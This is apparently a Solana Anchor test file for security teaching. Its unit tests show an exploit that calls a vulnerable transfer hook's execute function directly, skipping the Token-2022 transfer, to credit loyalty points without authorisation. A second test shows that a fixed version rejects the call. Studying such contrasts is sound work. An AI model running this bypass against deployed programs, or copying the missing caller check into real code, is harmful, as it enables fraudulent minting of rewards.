#![allow(unexpected_cfgs)]
use anchor_lang::prelude::*;

declare_id!("9LV9Gqweu4MSFZ3SpMeFYRcUWpTpuNJT2UKdpwgBX3xK");

#[program]
pub mod transfer_hook_attacker {
    use super::*;

    pub fn initialize(_ctx: Context<Initialize>) -> Result<()> {
        Ok(())
    }
}

#[derive(Accounts)]
pub struct Initialize {}

// --- UNIT TESTS ---
#[cfg(test)]
mod tests {
    use super::*;
    use anchor_lang::solana_program::account_info::AccountInfo;
    use anchor_lang::solana_program::clock::Epoch;
    use anchor_lang::{AnchorSerialize, AnchorDeserialize, Discriminator};
    use std::collections::BTreeSet;

    // Anchor generates the discriminator for the UserLoyaltyPoints struct
    // We import it here so we can mock its on-chain data layout
    #[derive(InitSpace, AnchorSerialize, AnchorDeserialize, Clone)]
    pub struct UserLoyaltyPointsMock {
        pub user: Pubkey,
        pub points: u64,
    }
    impl Discriminator for UserLoyaltyPointsMock {
        const DISCRIMINATOR: &'static [u8] = &[172, 185, 30, 167, 57, 165, 4, 181]; // generated from "account:UserLoyaltyPoints"
    }

    // Helper function to build a mock AccountInfo in memory
    fn make_account_with_key(
        key: Pubkey,
        owner: Pubkey,
        is_signer: bool,
        is_writable: bool,
        data: Vec<u8>,
    ) -> AccountInfo<'static> {
        let leaked_key = Box::leak(Box::new(key));
        let leaked_owner = Box::leak(Box::new(owner));
        let lamports = Box::leak(Box::new(1_000_000_000u64));
        let data: &'static mut [u8] = Box::leak(data.into_boxed_slice());

        AccountInfo::new(
            leaked_key,
            is_signer,
            is_writable,
            lamports,
            data,
            leaked_owner,
            false,
            Epoch::default(),
        )
    }

    // Serializes a mock instructions stack for sysvar testing
    fn construct_instructions_sysvar_data(program_ids: &[Pubkey], current_idx: u16) -> Vec<u8> {
        let mut data = Vec::new();
        let num_instructions = program_ids.len() as u16;
        data.extend_from_slice(&num_instructions.to_le_bytes());

        // Write offsets
        let mut current_offset = 2 + 2 * num_instructions;
        for _ in 0..num_instructions {
            data.extend_from_slice(&current_offset.to_le_bytes());
            current_offset += 36; // 32 bytes pubkey + 2 bytes accounts + 2 bytes data
        }

        // Write instructions
        for program_id in program_ids {
            data.extend_from_slice(program_id.as_ref());
            data.extend_from_slice(&0u16.to_le_bytes()); // 0 accounts
            data.extend_from_slice(&0u16.to_le_bytes()); // 0 data length
        }

        // Append the current instruction index
        data.extend_from_slice(&current_idx.to_le_bytes());

        data
    }

    #[test]
    fn test_exploit_on_vulnerable() {
        // --- STEP 1: ARRANGE ---
        let vuln_program_id = transfer_hook_vuln::id();

        let user_pubkey = Pubkey::new_unique();
        let mint_pubkey = Pubkey::new_unique();
        let source_token_pubkey = Pubkey::new_unique();
        let destination_token_pubkey = Pubkey::new_unique();

        // Format source_token data: 64 bytes with user_pubkey at offset 32..64
        let mut source_token_data = vec![0u8; 64];
        source_token_data[32..64].copy_from_slice(user_pubkey.as_ref());

        // Format loyalty_points PDA data: discriminator + user + 0 points
        let mut loyalty_data = Vec::new();
        loyalty_data.extend_from_slice(&UserLoyaltyPointsMock::DISCRIMINATOR);
        loyalty_data.extend_from_slice(user_pubkey.as_ref());
        loyalty_data.extend_from_slice(&0u64.to_le_bytes());

        // Derive the PDA address
        let (loyalty_pda, bump) = Pubkey::find_program_address(
            &[b"user_loyalty_points", user_pubkey.as_ref()],
            &vuln_program_id,
        );

        // Build mock AccountInfos
        let source_token_ai = make_account_with_key(
            source_token_pubkey,
            Pubkey::new_unique(),
            false,
            true,
            source_token_data,
        );
        let mint_ai = make_account_with_key(mint_pubkey, Pubkey::new_unique(), false, false, vec![]);
        let destination_token_ai = make_account_with_key(destination_token_pubkey, Pubkey::new_unique(), false, true, vec![]);
        let owner_ai = make_account_with_key(user_pubkey, Pubkey::new_unique(), false, false, vec![]);
        let loyalty_points_ai = make_account_with_key(loyalty_pda, vuln_program_id, false, true, loyalty_data);

        // Group into slice for try_accounts
        let infos: Box<[AccountInfo<'static>]> = vec![
            source_token_ai.clone(),
            mint_ai.clone(),
            destination_token_ai.clone(),
            owner_ai.clone(),
            loyalty_points_ai.clone(),
        ].into_boxed_slice();
        let mut info_slice: &[AccountInfo] = Box::leak(infos);

        let mut bumps = transfer_hook_vuln::TransferHookBumps { loyalty_points: bump };
        let mut reallocs = BTreeSet::new();

        // --- STEP 2: ACT ---
        // A. Parse the accounts list
        let mut parsed_accounts = transfer_hook_vuln::TransferHook::try_accounts(
            &vuln_program_id,
            &mut info_slice,
            &[],
            &mut bumps,
            &mut reallocs,
        ).unwrap();

        // B. Call the execute function directly
        let context = Context::new(
            &vuln_program_id,
            &mut parsed_accounts,
            &[],
            bumps,
        );
        let result = transfer_hook_vuln::transfer_hook_vuln::execute(context, 50);

        // Save/write the modified struct data back to the mock AccountInfo buffer
        parsed_accounts.loyalty_points.exit(&vuln_program_id).unwrap();

        // --- STEP 3: ASSERT ---
        // The call succeeds because the vulnerable program does not validate the caller!
        assert!(result.is_ok(), "Attacker should be able to trigger execute directly!");

        // Verify the points actually updated in the mock account data
        let updated_data = loyalty_points_ai.try_borrow_data().unwrap();
        let updated_state = UserLoyaltyPointsMock::deserialize(&mut &updated_data[8..]).unwrap();
        assert_eq!(updated_state.points, 50);
    }

    #[test]
    fn test_exploit_blocked_on_fixed() {
        // --- STEP 1: ARRANGE ---
        let fix_program_id = transfer_hook_fix::id();

        let user_pubkey = Pubkey::new_unique();
        let attacker_pubkey = Pubkey::new_unique();
        let mint_pubkey = Pubkey::new_unique();
        let source_token_pubkey = Pubkey::new_unique();
        let destination_token_pubkey = Pubkey::new_unique();
        let instructions_sysvar_pubkey = anchor_lang::solana_program::sysvar::instructions::ID;

        // Format source_token data: 64 bytes with user_pubkey at offset 32..64
        let mut source_token_data = vec![0u8; 64];
        source_token_data[32..64].copy_from_slice(user_pubkey.as_ref());

        // Format loyalty_points PDA data: discriminator + user + 0 points
        let mut loyalty_data = Vec::new();
        loyalty_data.extend_from_slice(&UserLoyaltyPointsMock::DISCRIMINATOR);
        loyalty_data.extend_from_slice(user_pubkey.as_ref());
        loyalty_data.extend_from_slice(&0u64.to_le_bytes());

        // Derive the PDA address
        let (loyalty_pda, bump) = Pubkey::find_program_address(
            &[b"user_loyalty_points", user_pubkey.as_ref()],
            &fix_program_id,
        );

        // Build mock AccountInfos
        let source_token_ai = make_account_with_key(
            source_token_pubkey,
            Pubkey::new_unique(),
            false,
            true,
            source_token_data,
        );
        let mint_ai = make_account_with_key(mint_pubkey, Pubkey::new_unique(), false, false, vec![]);
        let destination_token_ai = make_account_with_key(destination_token_pubkey, Pubkey::new_unique(), false, true, vec![]);
        let owner_ai = make_account_with_key(user_pubkey, Pubkey::new_unique(), false, false, vec![]);
        let loyalty_points_ai = make_account_with_key(loyalty_pda, fix_program_id, false, true, loyalty_data);
        
        // Mock the instructions sysvar. The preceding instruction in the transaction is NOT Token-2022.
        // Index 0: Attacker Program (direct caller)
        // Index 1: Transfer Hook execution (Current Instruction)
        let program_history = vec![
            attacker_pubkey, // Index 0: Attacker program (direct caller)
            fix_program_id,  // Index 1: The current instruction
        ];
        let instructions_data = construct_instructions_sysvar_data(&program_history, 1);
        let instructions_ai = make_account_with_key(instructions_sysvar_pubkey, Pubkey::default(), false, false, instructions_data);

        // Group into slice for try_accounts
        let infos: Box<[AccountInfo<'static>]> = vec![
            source_token_ai.clone(),
            mint_ai.clone(),
            destination_token_ai.clone(),
            owner_ai.clone(),
            loyalty_points_ai.clone(),
            instructions_ai.clone(),
        ].into_boxed_slice();
        let mut info_slice: &[AccountInfo] = Box::leak(infos);

        let mut bumps = transfer_hook_fix::TransferHookBumps { loyalty_points: bump };
        let mut reallocs = BTreeSet::new();

        // --- STEP 2: ACT ---
        // A. Parse the accounts list
        let mut parsed_accounts = transfer_hook_fix::TransferHook::try_accounts(
            &fix_program_id,
            &mut info_slice,
            &[],
            &mut bumps,
            &mut reallocs,
        ).unwrap();

        // B. Call the execute function directly
        let context = Context::new(
            &fix_program_id,
            &mut parsed_accounts,
            &[],
            bumps,
        );
        let result = transfer_hook_fix::transfer_hook_fix::execute(context, 50);

        // --- STEP 3: ASSERT ---
        // The call MUST fail with the caller validation error
        assert!(result.is_err(), "Direct execute call without Token-2022 CPI caller must be blocked!");
    }
}
